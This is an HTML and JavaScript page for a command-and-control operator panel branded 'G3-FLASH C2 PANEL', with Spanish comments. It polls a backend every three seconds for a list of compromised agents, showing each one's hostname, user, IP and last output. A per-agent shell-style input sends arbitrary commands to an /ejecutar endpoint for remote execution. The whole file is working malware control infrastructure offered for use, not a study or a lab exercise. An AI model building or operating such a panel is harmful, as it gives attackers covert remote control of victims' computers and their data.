<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>C2 - ADVANCED CONTROL PANEL</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        body {
            background-color: #0b0e14;
            color: #00ff41;
            font-family: 'Fira Code', monospace;
        }

        /* Contenedor principal con efecto de brillo */
        .main-container {
            border: 1px solid #1a1f29;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
            background: rgba(16, 20, 28, 0.9);
            border-radius: 8px;
            padding: 20px;
        }

        /* Estilo de la tabla */
        .table {
            color: #00ff41;
            border-color: #1a1f29;
            vertical-align: middle;
        }

        .table thead th {
            border-bottom: 2px solid #00ff41;
            text-transform: uppercase;
            font-size: 0.8rem;
            color: #00d4ff; /* Azul para cabeceras */
        }

        /* Input tipo terminal */
        .form-control {
            background-color: #05070a;
            border: 1px solid #00ff41;
            color: #00ff41;
            font-family: 'Fira Code', monospace;
        }

        .form-control:focus {
            background-color: #05070a;
            color: #00ff41;
            border-color: #00d4ff;
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
        }

        /* Área de respuesta (Terminal) */
        pre.respuesta-text {
            background: #000;
            border-left: 3px solid #00d4ff;
            padding: 10px;
            max-height: 150px;
            overflow-y: auto;
            color: #a0a0a0;
            font-size: 0.85rem;
        }

        /* Botón de ejecución */
        .btn-danger {
            background-color: transparent;
            border: 1px solid #ff003c;
            color: #ff003c;
            transition: 0.3s;
        }

        .btn-danger:hover {
            background-color: #ff003c;
            color: white;
            box-shadow: 0 0 15px #ff003c;
        }

        .status-dot {
            height: 10px;
            width: 10px;
            background-color: #00ff41;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
            box-shadow: 0 0 8px #00ff41;
        }
    </style>
</head>
<body class="p-4">

    <div class="container-fluid main-container">
        <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-3" style="border-color: #1a1f29 !important;">
            <h1 class="h3"><i class="fas fa-terminal"></i> G3-FLASH <span class="text-white">C2 PANEL</span></h1>
            <div class="text-end">
                <span class="badge bg-dark border border-success text-success me-3">
                    <span class="status-dot"></span> SYSTEM ONLINE
                </span>
                <a href="/logout" class="btn btn-sm btn-outline-warning"><i class="fas fa-sign-out-alt"></i> LOGOUT</a>
            </div>
        </div>

        <div class="table-responsive">
            <table class="table table-dark">
                <thead>
                    <tr>
                        <th><i class="fas fa-id-badge"></i> ID</th>
                        <th><i class="fas fa-desktop"></i> Hostname</th>
                        <th><i class="fas fa-user"></i> User</th>
                        <th><i class="fas fa-network-wired"></i> IP Address</th>
                        <th><i class="fas fa-code"></i> Last Output</th>
                        <th style="width: 300px;"><i class="fas fa-microchip"></i> Action</th>
                    </tr>
                </thead>
                <tbody id="tabla-agentes">
                    </tbody>
            </table>
        </div>
    </div>

    <script>
    async function actualizarAgentes() {
        try {
            const response = await fetch('/api/agentes');
            const agentes = await response.json();
            const tabla = document.getElementById('tabla-agentes');

            agentes.forEach(agente => {
                let filaExistente = document.getElementById(`fila-${agente.id}`);

                if (filaExistente) {
                    const celdaRespuesta = filaExistente.querySelector('.respuesta-text');
                    if (celdaRespuesta.innerText !== agente.resultado) {
                        celdaRespuesta.innerText = agente.resultado;
                    }
                } else {
                    const nuevaFila = `
                        <tr id="fila-${agente.id}" class="animate__animated animate__fadeIn">
                            <td>${agente.id}</td>
                            <td class="text-info">${agente.pc}</td>
                            <td class="text-white">${agente.user}</td>
                            <td>${agente.ip}</td>
                            <td><pre class="respuesta-text">${agente.resultado}</pre></td>
                            <td>
                                <div class="input-group">
                                    <input type="text" id="cmd-${agente.id}" class="form-control form-control-sm" placeholder="shell@c2:~#">
                                    <button class="btn btn-sm btn-danger" onclick="enviarComando(${agente.id})">
                                        <i class="fas fa-paper-plane"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    `;
                    tabla.insertAdjacentHTML('beforeend', nuevaFila);
                }
            });
        } catch (error) { console.error("Error:", error); }
    }

    async function enviarComando(id) {
        const inputCmd = document.getElementById(`cmd-${id}`);
        const cmd = inputCmd.value;
        if (!cmd) return;
        
        const formData = new FormData();
        formData.append('id', id);
        formData.append('comando', cmd);
        inputCmd.value = '';

        await fetch('/ejecutar', { method: 'POST', body: formData });
        actualizarAgentes();
    }

    setInterval(actualizarAgentes, 3000);
    actualizarAgentes();
    </script>
</body>
</html>
